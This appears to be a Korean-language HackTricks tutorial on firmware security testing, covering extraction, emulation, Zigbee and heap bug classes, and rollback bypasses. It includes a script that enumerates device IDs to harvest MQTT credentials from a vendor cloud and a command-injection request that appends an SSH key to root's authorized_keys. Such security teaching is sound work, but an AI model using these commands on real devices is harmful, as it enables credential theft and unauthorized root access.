# Firmware 분석

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **소개**

### 관련 리소스

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware는 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 지원하여 장치가 올바르게 작동하도록 하는 필수 소프트웨어입니다. Firmware는 영구 메모리에 저장되므로 장치가 전원이 켜지는 순간부터 중요한 명령에 액세스할 수 있으며, 이를 통해 운영 체제가 실행됩니다. 보안 취약점을 식별하려면 Firmware를 검사하고 필요에 따라 수정하는 것이 중요한 단계입니다.<sup>[[2]](#references)[[3]](#references)</sup>

## **정보 수집**

**정보 수집**은 장치의 구성과 장치가 사용하는 기술을 파악하는 데 중요한 초기 단계입니다. 이 과정에서는 다음 데이터를 수집합니다.

- CPU 아키텍처 및 실행 중인 운영 체제
- Bootloader 세부 정보
- 하드웨어 구성 및 데이터시트
- 코드베이스 지표 및 소스 위치
- 외부 라이브러리 및 라이선스 유형
- 업데이트 이력 및 규제 인증
- 아키텍처 및 흐름 다이어그램
- 보안 평가 및 식별된 취약점

이를 위해 **오픈 소스 인텔리전스(OSINT)** 도구는 매우 유용하며, 수동 및 자동화된 검토 프로세스를 통해 이용 가능한 오픈 소스 소프트웨어 구성 요소를 분석하는 것도 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore)과 같은 도구는 잠재적인 문제를 찾는 데 활용할 수 있는 무료 정적 분석을 제공합니다.

## **Firmware 확보**

Firmware는 여러 방법으로 확보할 수 있으며, 각 방법의 복잡도는 서로 다릅니다.

- 소스(개발자, 제조업체)에서 **직접 확보**
- 제공된 지침에 따라 **빌드**
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 Firmware 파일을 찾기 위해 **Google dork** 쿼리 활용
- [S3Scanner](https://github.com/sa7mon/S3Scanner)와 같은 도구로 **cloud storage**에 직접 액세스
- man-in-the-middle 기법으로 **업데이트** 가로채기
- **UART**, **JTAG** 또는 **PICit**과 같은 연결을 통해 장치에서 **추출**
- 장치 통신 내 업데이트 요청 **스니핑**
- **하드코딩된 업데이트 엔드포인트** 식별 및 사용
- Bootloader 또는 네트워크에서 **덤프**
- 다른 방법이 모두 실패한 경우 적절한 하드웨어 도구를 사용하여 저장 칩을 **제거하고 읽기**

### UART-only logs: U-Boot env를 flash에서 수정하여 root shell 강제 실행

UART RX가 무시되는 경우(로그만 출력되는 경우)에도 오프라인에서 **U-Boot environment blob을 편집**하여 init shell을 강제로 실행할 수 있습니다.<sup>[[6]](#references)</sup>

1. SOIC-8 클립과 프로그래머(3.3V)를 사용하여 SPI flash를 덤프합니다.
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env 파티션을 찾고, `bootargs`를 편집하여 `init=/bin/sh`를 포함시킨 다음 blob의 **U-Boot env CRC32를 다시 계산**합니다.
3. env 파티션만 다시 플래시하고 재부팅합니다. UART에 shell이 나타나야 합니다.

이는 Bootloader shell이 비활성화되어 있지만 외부 flash 액세스를 통해 env 파티션에 쓸 수 있는 embedded device에서 유용합니다.

## Firmware 분석

이제 **Firmware를 확보했으므로**, 이를 어떻게 다뤄야 하는지 파악하기 위해 Firmware에 대한 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 도구는 다양합니다.
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
이러한 도구를 사용해도 많은 정보를 찾지 못했다면 `binwalk -E <bin>`으로 이미지의 **entropy**를 확인하세요. entropy가 낮다면 암호화되지 않았을 가능성이 높습니다. entropy가 높다면 암호화되었을 가능성이 높습니다(또는 어떤 방식으로든 압축되었을 수 있습니다).

또한 이러한 도구를 사용하여 **firmware 내부에 embedded된 files**를 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

또는 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용하여 파일을 검사할 수 있습니다.

### Filesystem 가져오기

앞서 언급한 `binwalk -ev <bin>`과 같은 도구를 사용하면 **filesystem을 추출**할 수 있어야 합니다.\
Binwalk는 일반적으로 **filesystem type으로 이름이 지정된 folder** 내부에 이를 추출하며, 일반적으로 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 수동 Filesystem 추출

때때로 binwalk의 signatures에 filesystem의 **magic byte가 없을 수 있습니다**. 이러한 경우 binwalk를 사용하여 **filesystem의 offset을 찾고 binary에서 compressed filesystem을 carve한 다음**, 아래 단계에 따라 type에 맞게 filesystem을 **수동으로 extract**하세요.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem을 carve하려면 다음 **dd command**를 실행합니다.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs (위 예제에서 사용됨)

`$ unsquashfs dir.squashfs`

이후 파일은 "`squashfs-root`" 디렉터리에 위치합니다.

- CPIO archive 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일시스템의 경우

`$ jefferson rootfsfile.jffs2`

- NAND flash가 있는 ubifs 파일시스템의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware 분석

Firmware를 확보한 후에는 구조와 잠재적인 취약점을 파악하기 위해 이를 분석하는 것이 중요합니다. 이 과정에는 다양한 도구를 사용하여 firmware image를 분석하고 유용한 데이터를 추출하는 작업이 포함됩니다.

### 초기 분석 도구

binary 파일(`<bin>`으로 표시됨)을 처음 검사하기 위한 명령 모음이 제공됩니다. 이러한 명령은 파일 유형 식별, 문자열 추출, binary 데이터 분석, partition 및 filesystem 세부 정보 파악에 도움을 줍니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`을 사용하여 **엔트로피**를 확인합니다. 낮은 엔트로피는 암호화되지 않았을 가능성을 나타내며, 높은 엔트로피는 암호화 또는 압축되었을 가능성을 나타냅니다.

**embedded files**를 추출하려면 **file-data-carving-recovery-tools** 문서와 파일 검사를 위한 **binvis.io** 같은 도구 및 리소스를 사용하는 것이 좋습니다.

### 파일시스템 추출

`binwalk -ev <bin>`을 사용하면 일반적으로 파일시스템을 추출할 수 있으며, 결과는 대개 파일시스템 유형(예: squashfs, ubifs)을 이름으로 하는 디렉터리에 저장됩니다. 그러나 magic bytes가 없어 **binwalk**가 파일시스템 유형을 인식하지 못하는 경우에는 수동 추출이 필요합니다. 이 과정에서는 `binwalk`를 사용하여 파일시스템의 오프셋을 찾은 다음, `dd` 명령으로 파일시스템을 carve out합니다:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
이후 filesystem 유형(예: squashfs, cpio, jffs2, ubifs)에 따라 콘텐츠를 수동으로 추출하는 데 서로 다른 명령이 사용됩니다.

### Filesystem Analysis

filesystem을 추출하면 security flaw 검색이 시작됩니다. 안전하지 않은 network daemon, hardcoded credential, API endpoint, update server 기능, 컴파일되지 않은 code, startup script, offline analysis를 위한 compiled binary에 주의를 기울입니다.

**주요 위치**와 **검사 항목**은 다음과 같습니다.

- 사용자 credential을 확인하기 위한 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**의 SSL certificate 및 key
- 잠재적인 vulnerability를 확인하기 위한 configuration 및 script file
- 추가 analysis를 위한 embedded binary
- 일반적인 IoT device web server 및 binary

filesystem 내의 민감한 정보와 vulnerability를 찾는 데 여러 도구가 사용됩니다.

- 민감한 정보 검색을 위한 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 종합적인 firmware analysis를 위한 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static 및 dynamic analysis를 위한 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), [**EMBA**](https://github.com/e-m-b-a/emba)

### Security Checks on Compiled Binaries

filesystem에서 발견되는 source code와 compiled binary 모두 vulnerability가 있는지 면밀히 검사해야 합니다. Unix binary용 **checksec.sh** 및 Windows binary용 **PESecurity**와 같은 도구는 exploit될 수 있는 보호되지 않은 binary를 식별하는 데 도움을 줍니다.

## 파생된 URL token을 통한 cloud config 및 MQTT credential 수집

많은 IoT hub는 다음과 같은 형태의 cloud endpoint에서 device별 configuration을 가져옵니다.<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 중에 `<token>`이 hardcoded secret을 사용해 device ID에서 local하게 파생된다는 사실을 확인할 수 있습니다. 예를 들면 다음과 같습니다.

- token = MD5( deviceId || STATIC_KEY )이며 uppercase hex로 표현됨

이 설계를 통해 누구든지 deviceId와 STATIC_KEY를 알고 있으면 URL을 재구성하여 cloud config를 가져올 수 있으며, 이 과정에서 plaintext MQTT credential과 topic prefix가 노출되는 경우가 많습니다.

실제 workflow:

1) UART boot log에서 deviceId 추출

- 3.3V UART adapter(TX/RX/GND)를 연결하고 log를 수집합니다:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern 및 broker address를 출력하는 줄을 찾습니다. 예:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware에서 STATIC_KEY 및 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 config path ("/pf/") 또는 MD5 사용을 검색합니다.
- 알고리즘을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 도출하고 digest를 대문자로 변환합니다:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config 및 MQTT 자격 증명 수집

- URL을 구성하고 curl로 JSON을 가져온 다음, jq로 구문 분석하여 secrets를 추출합니다:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 평문 MQTT 및 취약한 topic ACL 악용(있는 경우)

- 복구한 자격 증명을 사용해 maintenance topic을 구독하고 민감한 이벤트를 확인합니다:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 예측 가능한 device ID 열거(대규모, 권한을 부여받은 경우)

- 많은 ecosystem은 vendor OUI/product/type 바이트 뒤에 순차적 suffix를 포함합니다.
- candidate ID를 반복하고, token을 도출하며, programmatically config를 가져올 수 있습니다:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
메모
- 대규모 열거를 시도하기 전에 항상 명시적인 권한을 획득하세요.
- 가능한 경우 대상 하드웨어를 수정하지 않고 secrets를 복구하기 위해 emulation 또는 static analysis를 우선하세요.


firmware를 emulation하는 과정에서는 장치의 동작 또는 개별 프로그램에 대해 **dynamic analysis**를 수행할 수 있습니다. 이 접근 방식은 하드웨어 또는 architecture 종속성으로 인해 문제가 발생할 수 있지만, root filesystem 또는 특정 binary를 Raspberry Pi와 같이 architecture와 endianness가 일치하는 장치나 사전 구축된 virtual machine으로 전송하면 추가 테스트를 수행할 수 있습니다.

### 개별 Binary Emulation

단일 프로그램을 검사하려면 프로그램의 endianness와 CPU architecture를 식별하는 것이 중요합니다.

#### MIPS Architecture 예시

MIPS architecture binary를 emulation하려면 다음 명령을 사용할 수 있습니다:
```bash
file ./squashfs-root/bin/busybox
```
필요한 에뮬레이션 도구를 설치하려면:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian)의 경우 `qemu-mips`를 사용하며, little-endian 바이너리에는 `qemu-mipsel`을 사용합니다.

#### ARM Architecture Emulation

ARM 바이너리의 경우에도 프로세스는 유사하며, `qemu-arm` emulator를 사용해 emulation을 수행합니다.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)과 같은 도구는 full firmware emulation을 지원하여 프로세스를 자동화하고 dynamic analysis를 보조합니다.

## Dynamic Analysis in Practice

이 단계에서는 실제 또는 emulated device environment를 사용하여 분석을 수행합니다. OS와 filesystem에 대한 shell access를 유지하는 것이 중요합니다. Emulation이 hardware interactions를 완벽하게 모방하지 못할 수 있으므로 emulation을 가끔 재시작해야 할 수 있습니다. 분석 시 filesystem을 다시 확인하고, 노출된 webpages와 network services를 exploit하며, bootloader vulnerabilities를 조사해야 합니다. 잠재적인 backdoor vulnerabilities를 식별하려면 firmware integrity tests가 중요합니다.

## Runtime Analysis Techniques

Runtime analysis는 운영 환경에서 process 또는 binary와 상호작용하는 작업으로, gdb-multiarch, Frida, Ghidra와 같은 도구를 사용하여 breakpoints를 설정하고 fuzzing 및 기타 기법을 통해 vulnerabilities를 식별합니다.

Full debugger가 없는 embedded targets의 경우, **statically-linked `gdbserver`를 device에 복사한 후 원격으로 attach합니다**:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub에서 RF stack은 종종 **radio MCU**와 Linux userland process 사이에 분리되어 있습니다. 유용한 workflow는 다음 경로를 매핑하는 것입니다:<sup>[[8]](#references)</sup>

1. **RF frame** on the air
2. **controller-side parser** on the radio MCU
3. Linux로 전달되는 **serial/UART text or TLV protocol** (예: `/dev/tty*`)
4. 메인 daemon의 **application dispatcher**
5. **protocol-specific handler / state machine**

이 architecture는 하나가 아닌 두 개의 reversing target을 만듭니다. controller가 binary radio frame을 `Group,Command,arg1,arg2,...`와 같은 textual protocol로 변환한다면 다음을 복구해야 합니다.

- **message groups** 및 dispatch tables
- 어떤 message가 **network**에서 올 수 있고 어떤 것이 controller 자체에서 올 수 있는지
- 정확한 **manufacturer-specific discriminator fields** (예: Zigbee `manufacturer_code` 및 custom `cluster_command`)
- 어떤 handler가 **commissioning**, discovery 또는 firmware/model download phase에서만 도달 가능한지

특히 Zigbee에서는 pairing traffic을 capture하고 target이 여전히 기본 **Link Key** `ZigBeeAlliance09`에 의존하는지 확인합니다. 그렇다면 commissioning traffic을 sniff하여 **Network Key**가 노출될 수 있습니다. Zigbee 3.0 install codes는 이러한 노출을 줄이므로, 테스트한 device가 실제로 이를 enforce하는지 기록해야 합니다.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL command는 standardized cluster보다 더 나은 target인 경우가 많습니다. **custom parsing code**와 충분히 검증되지 않은 내부 **FSM**으로 전달되기 때문입니다.<sup>[[8]](#references)</sup>

Practical workflow:

- command dispatcher를 reverse하여 **vendor-only handler**를 찾습니다.
- **FSM state**, **event**, **check**, **action**, **next-state** table을 복구합니다.
- 자동으로 진행되는 **transitional state**와, 최종적으로 attacker-controlled state를 reset하거나 free하는 retry/error branch를 식별합니다.
- buggy handler가 항상 reachable하다고 가정하지 말고, daemon을 vulnerable state에 배치하기 위해 어떤 정상적인 protocol exchange가 필요한지 확인합니다.

Timing-sensitive protocol에서는 Python framework의 packet replay가 너무 느릴 수 있습니다. 더 reliable한 방법은 **nRF52840**과 같은 real hardware에서 vendor-grade stack을 사용해 legitimate device를 emulate하는 것입니다. 이를 통해 올바른 **endpoints**, **attributes** 및 commissioning timing을 노출할 수 있습니다.

### Fragmented-download bug class in embedded daemons

**fragmented blob/model/configuration download**에서 반복적으로 나타나는 firmware bug class는 다음과 같습니다.<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`)가 `ctx->total_size`를 저장하고 `malloc(total_size)`를 할당합니다.
2. 이후 fragment는 `packet_total_size >= offset + chunk_len`과 같은 attacker-controlled **packet-local** field만 검증합니다.
3. copy는 **original allocated size**에 대한 확인 없이 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`을 사용합니다.

이를 통해 attacker는 다음을 전송할 수 있습니다.

- 작은 heap allocation을 강제하는 **small** declared total size의 첫 번째 유효 fragment
- **expected offset**이지만 더 큰 `chunk_len`을 가진 후속 fragment
- 새 검사를 충족하면서도 원래 할당된 buffer를 overflow시키는 forged packet-local size

vulnerable path가 commissioning logic 뒤에 있다면, malformed fragment를 전송하기 전에 target을 예상된 model-download 또는 blob-download state로 이동시키기에 충분한 **device emulation**을 exploit에 포함해야 합니다.

### Protocol-driven `free()` triggers

embedded daemon에서 heap metadata exploitation을 trigger하는 가장 쉬운 방법은 대개 "wait for cleanup"이 아니라 protocol 자체의 **error handling**을 강제하는 것입니다.<sup>[[8]](#references)</sup>

- malformed follow-up fragment를 전송하여 FSM을 **retry** 또는 **error** state로 이동시킵니다.
- retry threshold를 초과하여 daemon이 **resets context**하고 corrupted buffer를 free하도록 합니다.
- 이 예측 가능한 `free()`를 사용해 process가 관련 없는 이유로 crash하기 전에 allocator-side primitive를 trigger합니다.

이는 embedded Linux의 **musl/uClibc/dlmalloc-like** allocator에 특히 유용합니다. chunk metadata를 corrupt하면 unlink/unbin logic이 write primitive로 변할 수 있기 때문입니다. 안정적인 pattern은 real bin pointer를 즉시 덮어써 process를 crash시키는 대신, **size field**를 corrupt하여 allocator traversal을 overflow된 buffer 내부에 배치한 **fake chunks**로 redirect하는 것입니다.

## Binary Exploitation and Proof-of-Concept

식별된 vulnerability에 대한 PoC를 개발하려면 target architecture에 대한 깊은 이해와 lower-level language를 사용한 programming이 필요합니다. embedded system에서는 binary runtime protection이 드물지만, 존재하는 경우 Return Oriented Programming (ROP)과 같은 technique이 필요할 수 있습니다.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc는 glibc와 유사한 fastbin을 사용합니다. 이후의 large allocation은 `__malloc_consolidate()`를 trigger할 수 있으므로, fake chunk는 검사(sane size, `fd = 0`, 주변 chunk가 "in use"로 인식되는지)를 통과해야 합니다.<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLR이 enabled이지만 main binary가 **non-PIE**라면, binary 내부 `.data/.bss` address는 stable합니다. 이미 valid heap chunk header와 유사한 region을 target하여 fastbin allocation을 **function pointer table**에 배치할 수 있습니다.
- **Parser-stopping NUL:** JSON이 parse될 때 payload의 `\x00`은 parsing을 중지시키면서 stack pivot/ROP chain에 사용할 trailing attacker-controlled bytes는 유지할 수 있습니다.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain은 known mapping에 executable shellcode를 배치한 뒤 해당 위치로 jump할 수 있습니다.

## Firmware Analysis를 위한 Prepared Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) 및 [EmbedOS](https://github.com/scriptingxss/EmbedOS)와 같은 operating system은 firmware security testing에 필요한 tool이 사전 구성된 environment를 제공합니다.

## Firmware를 분석하기 위한 Prepared OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) device의 security assessment 및 penetration testing을 수행할 수 있도록 설계된 distro입니다. 필요한 모든 tool이 loaded된 pre-configured environment를 제공하여 많은 시간을 절약합니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tool이 사전 설치된 Ubuntu 18.04 기반 embedded security testing operating system입니다.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendor가 firmware image에 대한 cryptographic signature check를 구현하더라도 **version rollback (downgrade) protection은 자주 누락됩니다**. boot- 또는 recovery-loader가 embedded public key로 signature만 verify하고 flash되는 image의 *version*(또는 monotonic counter)을 비교하지 않는 경우, attacker는 **valid signature가 여전히 존재하는 older, vulnerable firmware**를 합법적으로 설치하여 patch된 vulnerability를 다시 활성화할 수 있습니다.<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **Obtain an older signed image**
* vendor의 public download portal, CDN 또는 support site에서 가져옵니다.
* companion mobile/desktop application에서 추출합니다 (예: Android APK의 `assets/firmware/` 내부).
* VirusTotal, Internet archive, forum 등의 third-party repository에서 가져옵니다.
2. 노출된 update channel을 통해 device에 image를 **upload or serve**합니다.
* Web UI, mobile-app API, USB, TFTP, MQTT 등
* 많은 consumer IoT device는 *unauthenticated* HTTP(S) endpoint를 노출하며, Base64-encoded firmware blob을 받고 server-side에서 decode한 뒤 recovery/upgrade를 trigger합니다.
3. downgrade 후 newer release에서 patch된 vulnerability를 exploit합니다 (예: 나중에 추가된 command-injection filter).
4. persistence를 확보한 후 detection을 피하기 위해 선택적으로 latest image를 다시 flash하거나 update를 disable합니다.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
취약한 (downgrade된) firmware에서는 `md5` parameter가 sanitisation 없이 shell command에 직접 연결되므로, 임의의 command를 injection할 수 있습니다(여기서는 SSH key-based root access를 활성화). 이후 firmware 버전에서는 기본적인 character filter가 도입되었지만, downgrade protection이 없어 이 수정은 무의미합니다.<sup>[[4]](#references)</sup>

### Mobile Apps에서 Firmware 추출

많은 vendor는 app이 Bluetooth/Wi-Fi를 통해 device를 업데이트할 수 있도록 companion mobile application 내부에 전체 firmware images를 포함합니다. 이러한 package는 일반적으로 `assets/fw/` 또는 `res/raw/`와 같은 경로의 APK/APEX에 암호화되지 않은 상태로 저장됩니다. `apktool`, `ghidra` 또는 단순한 `unzip`과 같은 tools를 사용하면 physical hardware에 접근하지 않고도 signed images를 추출할 수 있습니다.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot 설계에서 updater-only anti-rollback 우회

일부 vendor는 anti-downgrade **ratchet**을 구현하지만, *updater* logic 내부에서만 구현한다(예: CAN을 통한 UDS routine, recovery command 또는 userspace OTA agent). 이후 **bootloader**가 image signature/CRC만 확인하고 partition table 또는 slot metadata를 신뢰한다면, rollback protection은 여전히 우회될 수 있다.<sup>[[7]](#references)</sup>

일반적인 취약 설계:

- Firmware metadata에 version descriptor와 **security ratchet** / monotonic counter가 모두 포함된다.
- Updater는 image ratchet을 persistent storage에 저장된 값과 비교하고, 더 오래된 signed image를 거부한다.
- Bootloader는 해당 ratchet을 **parse**하지 않고, 부팅 전에 header, CRC 및 signature만 검증한다.
- Slot activation은 partition table 또는 per-slot generation counter에 별도로 저장되며, 검증된 정확한 firmware digest에 **cryptographically bound**되지 않는다.

이로 인해 dual-slot system에서 **validate-one-image / boot-another-image** primitive이 생성된다. Attacker가 updater를 통해 current signed image를 사용하여 slot B를 다음 boot target으로 지정하고, reboot 전에 slot B를 나중에 overwrite할 수 있다면, bootloader는 이미 commit된 slot metadata만 신뢰하기 때문에 downgraded image를 여전히 boot할 수 있다.

일반적인 abuse pattern:

1. **current signed** firmware를 passive slot에 upload하고, 일반적인 validation/switch routine을 실행하여 해당 slot이 next active slot으로 표시되도록 한다.
2. **아직 reboot하지 않는다**. 동일한 session에서 slot-preparation/erase routine에 다시 진입한다.
3. Stale boot-state 또는 stale slot-selection logic을 악용하여, updater가 방금 promoted된 **동일한 physical slot**을 erase하도록 한다.
4. **더 오래되었지만 여전히 signed된** firmware를 해당 slot에 write한다.
5. Ratchet을 적용하는 validation routine을 건너뛰고 직접 reboot한다.
6. Bootloader는 promoted slot을 선택하고 signature/integrity만 확인한 뒤 old image를 boot한다.

A/B update implementation을 reversing할 때 확인할 사항:

- 성공적인 switch 이후에도 갱신되지 않는 **boot-time flags**에서 slot selection이 파생되는지 여부
- **현재 commit된 layout**이 아니라 stale state를 기준으로 slot을 erase하는 `prepare_passive_slot()` 스타일 routine이 있는지 여부
- **generation counter** / active flag만 증가시키고 검증된 image hash를 저장하지 않는 `part_write_layout()` 스타일 function이 있는지 여부
- Userspace 또는 updater code에는 ratchet check가 구현되어 있지만 ROM / bootloader / secure boot stage에는 구현되어 있지 않은지 여부
- Erase 또는 recovery routine이 slot의 content를 제거하고 다시 write한 뒤에도 해당 slot을 bootable 상태로 남겨두는지 여부

### Update Logic 평가 Checklist

* *update endpoint*의 transport/authentication이 충분히 보호되는가(TLS + authentication)?
* Flashing 전에 device가 **version numbers** 또는 **monotonic anti-rollback counter**를 비교하는가?
* Image가 secure boot chain 내부에서 검증되는가(예: ROM code가 signature를 확인)?
* **Bootloader가 updater와 동일한 ratchet을 enforce**하는가, 아니면 signature/CRC만 확인하는가?
* Slot activation metadata가 **검증된 firmware digest/version에 bound**되어 있는가, 아니면 promotion 이후 slot을 수정할 수 있는가?
* Slot switch가 성공한 뒤 device가 reboot을 강제하는가, 아니면 이후의 update/erase routine이 동일한 session에서 계속 접근 가능한가?
* Userland code가 추가적인 sanity check를 수행하는가(예: 허용된 partition map, model number)?
* *Partial* 또는 *backup* update flow가 동일한 validation logic을 재사용하는가?

> 💡  위 항목 중 하나라도 누락되어 있다면 해당 platform은 rollback attack에 취약할 가능성이 높다.

## 실습용 Vulnerable firmware

Firmware에서 vulnerability를 발견하는 연습을 하려면 다음 vulnerable firmware project를 시작점으로 사용한다.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state에서 firmware decryption key 복구

Update image가 작은 plaintext metadata와 큰 high-entropy blob을 함께 포함하는 경우, 무엇이든 brute-forcing하기 전에 container triage를 수행한다:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` 및 `binwalk -E`를 사용하여 header, offset 및 line boundary를 dump한다.
- `Salted__`는 일반적으로 OpenSSL `enc` format을 의미한다. 다음 8 bytes는 salt이고 나머지 bytes는 ciphertext이다.
- 정확히 `256` bytes로 decode되는 Base64 field는 random firmware password/session key를 wrapping하는 RSA-2048 ciphertext를 보고 있다는 강력한 단서다.
- 동일한 file에 있는 Detached PGP material은 authenticity만 보호하는 경우가 많다. 이를 confidentiality mechanism이라고 가정하지 않는다.

Static key hunting(`grep`, `strings`, PEM/PGP search)이 실패하면 private key만 검색하지 말고 **operational decrypt path**를 reverse한다.

- Updater / management binary를 decompile하고 encrypted blob을 읽는 주체, 이를 unwrap하는 helper/API 및 요청하는 logical key name을 추적한다.
- Extracted root filesystem에서 KMS state(`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`)와 unit file 및 init script를 검색한다.
- Plaintext `vault operator unseal ...`, recovery key, bootstrap token 또는 local KMS auto-unseal script는 private-key material과 동일하게 취급한다.

